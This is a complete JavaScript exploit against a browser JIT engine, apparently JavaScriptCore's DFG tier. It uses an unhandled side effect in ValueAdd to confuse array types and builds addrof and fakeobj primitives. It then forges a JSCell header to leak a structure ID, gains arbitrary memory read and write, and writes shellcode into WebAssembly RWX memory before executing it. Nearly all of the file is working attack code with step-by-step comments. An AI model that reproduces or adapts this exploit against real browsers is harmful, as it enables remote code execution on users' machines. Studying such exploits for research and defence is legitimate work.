//====================================
//        print object info
//====================================
function printObj(o){print(describe(o));}

//====================================
// convert between double and integer
//====================================
const buf = new ArrayBuffer(8);
const f64 = new Float64Array(buf);
const u32 = new Uint32Array(buf);
// Floating point to 64-bit unsigned integer
function f2i(val)
{
    f64[0] = val;
    return u32[1] * 0x100000000 + u32[0];
}
// 64-bit unsigned integer to Floating point
function i2f(val)
{
    let tmp = [];
    tmp[0] = parseInt(val % 0x100000000);
    tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
    u32.set(tmp);
    return f64[0];
}
// 64-bit unsigned integer to jsValue
function i2obj(val)
{
    if(val > 0x2000000000000){
        return i2f(val-0x02000000000000);
    } else{
        var tmp = 0xffffffffffffffff - val +1;
        return tmp
    }
}
// 64-bit unsigned integer to hex
function hex(i)
{
    return "0x"+i.toString(16).padStart(16, "0");
}

//==============================================
//bug: DFG will not clobberize world even if 
//     ValueAdd op cause a side effect.
//
//how to exp: Using ValueAdd to make a side effect.
//            Make a double array to a object array.
//            But in jited code, it will still be 
//            considered as a double array.
//==============================================

function addrof(obj){
    var victim = [13.37, 2.2, 114.514];
	victim['a'] = 1;
    var hax = function(o, evil){
        o[1] = 2.2;
        a = evil + 1; // make side effect here
        // the effect will not lead to clobberize or OSR
        // so this func is still jited, and the type of o will be kept
        return o[0];
    }

    // jit
    for(var i = 0; i < 10000; i++){
        hax(victim, {});
    }

	var objaddr = hax(victim, {
    toString:() => {victim[0] = obj; return 1;}
    });

    return f2i(objaddr);
}
//============= test addrof ===============
// arr = {a:1, b:2};
// printObj(arr);
// print(hex(addrof(arr)))
// readline()
//=========================================

function fakeobj(addr){
    var victim = [13.37, 2.2, 114.514];
	victim['a'] = 1;
    var hax = function(o, evil){
        o[2] = 514.114
        o[1] = 2.2;
        a = evil + 1; // make side effect here
        o[0] = addr;
    }

    // jit
    for(var i = 0; i < 10000; i++){
        hax(victim, {});
    }

    hax(victim, {
    toString:() => {victim[2] = {}; return 1;}
    });

    return victim[0];
}

//================================
//     leak structure id
//================================
print("[*] leak structure id ")
print("[*] spray ");
let noCow = 13.37;
let spray = [];
for(var i = 0; i < 1000 ; i++){
	spray.push([noCow, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6]);
}

let leakTarget = [noCow, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6];

// let jscell_header = new Int64([
//       0x00, 0x10, 0x00, 0x00,     // m_structureID
//       0x7,                        // m_indexingType (ArrayWithDouble)
//       0x24,                       // m_type
//       0x08,                       // m_flags
//       0x1                         // m_cellState
// ]).asDouble();

let leakContainer = {
    cellHeader: i2obj(0x0108240700001000), 
    butterfly: leakTarget,
};
print("[*] crafted container");

let leakFakeObjAddr = addrof(leakContainer) + 0x10;
let leakFakeObj = fakeobj(i2f(leakFakeObjAddr));

print("[*] clean cached invalid id");
let legitArr = leakTarget;
results = [];
results.push(leakFakeObj[0]);
results.push(legitArr[0]);
  
f64[0] = results[0];
let structureID = u32[0];
print("[+] leak structure id: " + hex(structureID));
u32[1] = 0x01082407 - 0x20000;
leakContainer.cellHeader = f64[0];

//==========================================
//    getting aaw and aar
//==========================================
// var unboxed = eval('[' + '13.37,'.repeat(1000) + ']');
var unboxed = [noCow, 13.37, 13.37]; // ArrayWithDouble
let boxed = [{}];
let victim = [noCow, 14.47, 15.57];
victim.prop = 13.37;
//victim['prop_0'] = 13.37;
var unboxed_addr = addrof(unboxed);
print('[*] unboxed_addr = ' + hex(unboxed_addr));
var boxed_addr = addrof(boxed);
print('[*] boxed_addr = ' + hex(boxed_addr));
var victim_addr = addrof(victim);
print('[*] victim_addr = ' + hex(victim_addr));


// 1. fake obj
u32[0] = structureID; // Structure ID
u32[1] = 0x01082409 - 0x20000; // Fake JSCell metadata
var outer = {
    p0: f64[0],    // Structure ID and metadata
    p1: victim,   // butterfly
};

var fake_addr = addrof(outer) + 0x10;
print('[+] fake_addr = ' + hex(fake_addr));
driver = fakeobj(i2f(fake_addr));

u32[0] = structureID;
u32[1] = 0x01082407-0x20000; // Fake JSCell metadata
outer.p0 = f64[0];
var victim_butterfly = f2i(driver[1]);
print('[*] victim_butterfly = ' + hex(victim_butterfly));

// 2. create shared butterfly
u32[0] = structureID;
u32[1] = 0x01082409 - 0x20000; // Fake JSCell metadata
outer.p0 = f64[0];
print("[*] create shared butterfly")
driver[1] = unboxed;
var shared_butterfly = victim[1];
print("[+] shared butterfly addr: " + hex(f2i(shared_butterfly)));
driver[1] = boxed;
victim[1] = shared_butterfly;

// set driver's cell header to double array
u32[0] = structureID;
u32[1] = 0x01082407-0x20000; // Fake JSCell metadata
outer.p0 = f64[0];
driver[1] = i2f((victim_butterfly));

function newAddrof(obj) {
   boxed[0] = obj;
   return f2i(unboxed[0]);
}


function newFakeobj(addr) {
     unboxed[0] = i2f(addr);
     return boxed[0];            
}


var new_victim = [];
/* victim.p0 is at victim->butterfly - 0x10 */
new_victim.p0 = 0x1337;
function victim_write(val) {
     new_victim.p0 = val;
}

function victim_read() {
     return new_victim.p0;
}

outer.p1 = new_victim;

function read64(addr) {
    driver[1] = i2f(addr+0x10);
    return newAddrof(victim_read());
}


function write64(addr, val) {
    driver[1] = i2f(addr+0x10);
    victim_write(val);
}

function write(where, values) {
    for (var i = 0; i < values.length; ++i) {
        if (values[i] != 0)
            this.write64(where + i*8, values[i])
    }
}

//=====================================
//       hijack control flow
//=====================================
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;

var addr_f = addrof(f);
print("[+] wasmObj addr: " + hex(addr_f));
var addr_p = read64(addr_f + 0x30);
var addr_shellcode = read64(addr_p);
print("[+] rwx addr: " + hex(addr_shellcode));


var shellcode = [2.599171142164121e-71, 2.9952128517353027e-80, -2.3232808130702675e+35, 4.25349812314964e-309];

// write shellcode to rwx mem
write(addr_shellcode, shellcode);
// readline();

// trigger shellcode to execute
f();

